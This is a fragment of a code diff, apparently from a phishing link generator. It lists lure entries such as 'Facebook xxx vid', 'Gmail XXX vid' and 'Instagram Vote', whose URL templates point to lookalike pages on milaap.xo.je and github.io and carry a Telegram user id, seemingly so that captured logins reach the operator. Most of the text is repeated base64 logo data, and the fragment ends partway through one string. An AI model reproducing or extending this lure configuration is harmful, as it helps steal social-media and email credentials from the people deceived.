+      { name: "Facebook xxx vid",  image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/pf/pf.html?id={telegram-id}" },
       { name: "Instagram xxx Vid", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://milaap.xo.je/sh/pf/pi.html?id={telegram-id}" },
-      { name: "Twitter(X) XXX vid", image: "data:image/jpeg;base64,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", urlTemplate: "https://milaap.xo.je/sh/pf/px.html?id={telegram-id}" },
-      { name: "Gmail XXX vid", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/pf/pg.html?id={telegram-id}" },
-      { name: "Tiktok XXX vid", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/pf/pt.html?id={telegram-id}" },
-      // they ends here
-      { name: "Facebook", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/f.html?id={telegram-id}" },
-      { name: "Twitter(X)", image: "data:image/jpeg;base64,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", urlTemplate: "https://fitxl.github.io/da/file/x.html?id={telegram-id}" },
-      { name: "Gmail", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/g.html?id={telegram-id}" },
-      //added codes goes here //
-                               //another links added//
-                                     { name: "Facebook Vote", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/cv/cf.html?id={telegram-id}" },
-      { name: "Instagram Vote", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://milaap.xo.je/sh/cv/ci.html?id={telegram-id}" },
-      { name: "Twitter(X) Vote", image: "data:image/jpeg;base64,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